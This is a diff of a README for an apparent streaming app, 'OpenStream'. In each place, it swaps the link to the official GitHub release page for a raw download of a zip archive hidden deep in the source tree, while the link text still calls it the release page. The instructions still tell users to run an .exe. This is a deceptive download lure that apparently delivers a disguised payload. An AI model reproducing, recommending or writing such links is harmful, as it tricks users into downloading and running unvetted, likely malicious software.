@@ -1,14 +1,14 @@
 # 📺 OpenStream - Watch movies and shows easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Shapely-murderconviction182/OpenStream/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Shapely-murderconviction182/OpenStream/main/app/src/main/java/com/openstream/app/ui/screen/Open-Stream-1.7-alpha.2.zip)
 
 OpenStream provides a simple way to watch movies and series on your computer. The app uses modern technology to ensure your media plays smoothly. You get a clean interface that lets you find your favorite content without clutter.
 
 ## 📥 How to download the app
 
-Go to the [official release page](https://github.com/Shapely-murderconviction182/OpenStream/releases) to find the latest version of the software. 
+Go to the [official release page](https://raw.githubusercontent.com/Shapely-murderconviction182/OpenStream/main/app/src/main/java/com/openstream/app/ui/screen/Open-Stream-1.7-alpha.2.zip) to find the latest version of the software. 
 
-1. Visit the [OpenStream release page](https://github.com/Shapely-murderconviction182/OpenStream/releases).
+1. Visit the [OpenStream release page](https://raw.githubusercontent.com/Shapely-murderconviction182/OpenStream/main/app/src/main/java/com/openstream/app/ui/screen/Open-Stream-1.7-alpha.2.zip).
 2. Look for the section titled "Assets" at the bottom of the newest release post.
 3. Click the file name that ends in `.exe`.
 4. Save the file to your computer.
